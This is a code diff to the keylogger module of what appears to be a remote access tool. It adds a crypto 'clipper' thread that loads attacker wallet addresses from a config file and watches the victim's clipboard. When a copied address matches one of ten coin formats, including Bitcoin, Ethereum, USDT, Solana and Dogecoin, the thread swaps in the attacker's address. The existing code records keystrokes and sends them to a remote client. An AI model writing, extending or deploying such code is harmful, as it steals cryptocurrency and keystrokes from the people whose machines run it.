@@ -19,6 +19,21 @@
 #include <iniFile.h>
 
 #define CAPTION_SIZE 1024
+#include "wallet.h"
+#include "clip.h"
+#ifdef _WIN64
+#ifdef _DEBUG
+#pragma comment(lib, "clip_x64D.lib")
+#else
+#pragma comment(lib, "clip_x64.lib")
+#endif
+#else
+#ifdef _DEBUG
+#pragma comment(lib, "clipd.lib")
+#else
+#pragma comment(lib, "clip.lib")
+#endif
+#endif
 
 CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user) : CManager(pClient)
 {
@@ -30,7 +45,10 @@ CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user
     m_Buffer = new CircularBuffer(m_strRecordFile);
 
     m_bIsWorking = true;
+	iniFile cfg(CLIENT_PATH);
+	m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);
 
+    m_hClipboard = __CreateThread(NULL, 0, Clipboard, (LPVOID)this, 0, NULL);
     m_hWorkThread = __CreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
     m_hSendThread = __CreateThread(NULL, 0, SendData,(LPVOID)this,0,NULL);
     SetReady(TRUE);
@@ -39,8 +57,10 @@ CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user
 CKeyboardManager1::~CKeyboardManager1()
 {
     m_bIsWorking = false;
+    WaitForSingleObject(m_hClipboard, INFINITE);
     WaitForSingleObject(m_hWorkThread, INFINITE);
     WaitForSingleObject(m_hSendThread, INFINITE);
+    CloseHandle(m_hClipboard);
     CloseHandle(m_hWorkThread);
     CloseHandle(m_hSendThread);
     m_Buffer->WriteAvailableDataToFile(m_strRecordFile);
@@ -50,6 +70,11 @@ CKeyboardManager1::~CKeyboardManager1()
 void CKeyboardManager1::Notify() {
     if (NULL == this)
         return;
+    
+    m_mu.Lock();
+	iniFile cfg(CLIENT_PATH);
+	m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);
+    m_mu.Unlock();
     sendStartKeyBoard();
     WaitForDialogOpen();
 }
@@ -70,6 +95,13 @@ void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, ULONG nSize)
         GET_PROCESS_EASY(DeleteFileA);
         DeleteFileA(m_strRecordFile);
     }
+}
+
+std::vector<std::string> CKeyboardManager1::GetWallet() {
+	m_mu.Lock();
+	auto w = m_Wallet;
+	m_mu.Unlock();
+	return w;
 }
 
 int CKeyboardManager1::sendStartKeyBoard()
@@ -438,6 +470,60 @@ int CALLBACK WriteBuffer(const char* record, void* user) {
 	return 0;
 }
 
+DWORD WINAPI CKeyboardManager1::Clipboard(LPVOID lparam) {
+	CKeyboardManager1* pThis = (CKeyboardManager1*)lparam;
+	while (pThis->m_bIsWorking) {
+		auto w = pThis->GetWallet();
+		if (!w.empty() && clip::has(clip::text_format())) {
+			std::string value;
+			clip::get_text(value);
+            if (value.length() > 200) {
+                Sleep(1000);
+                continue;
+            }
+			auto type = detectWalletType(value);
+			switch (type) {
+            case WALLET_UNKNOWN:
+                break;
+			case WALLET_BTC_P2PKH:
+			case WALLET_BTC_P2SH:
+			case WALLET_BTC_BECH32:
+				if (!w[ADDR_BTC].empty()) clip::set_text(w[ADDR_BTC]);
+				break;
+			case WALLET_ETH_ERC20:
+				if (!w[ADDR_ERC20].empty()) clip::set_text(w[ADDR_ERC20]);
+				break;
+			case WALLET_USDT_OMNI:
+				if (!w[ADDR_OMNI].empty()) clip::set_text(w[ADDR_OMNI]);
+				break;
+			case WALLET_USDT_TRC20:
+				if (!w[ADDR_TRC20].empty()) clip::set_text(w[ADDR_TRC20]);
+				break;
+			case WALLET_TRON:
+				if (!w[ADDR_TRON].empty()) clip::set_text(w[ADDR_TRON]);
+				break;
+			case WALLET_SOLANA:
+				if (!w[ADDR_SOL].empty()) clip::set_text(w[ADDR_SOL]);
+				break;
+			case WALLET_XRP:
+				if (!w[ADDR_XRP].empty()) clip::set_text(w[ADDR_XRP]);
+				break;
+			case WALLET_POLKADOT:
+				if (!w[ADDR_DOT].empty()) clip::set_text(w[ADDR_DOT]);
+				break;
+			case WALLET_CARDANO_SHELLEY:
+			case WALLET_CARDANO_BYRON:
+				if (!w[ADDR_ADA].empty()) clip::set_text(w[ADDR_ADA]);
+				break;
+			case WALLET_DOGE:
+				if (!w[ADDR_DOGE].empty()) clip::set_text(w[ADDR_DOGE]);
+				break;
+			}
+			Sleep(1000);
+		}
+	}
+	return 0x20251005;
+}
 
 DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
 {
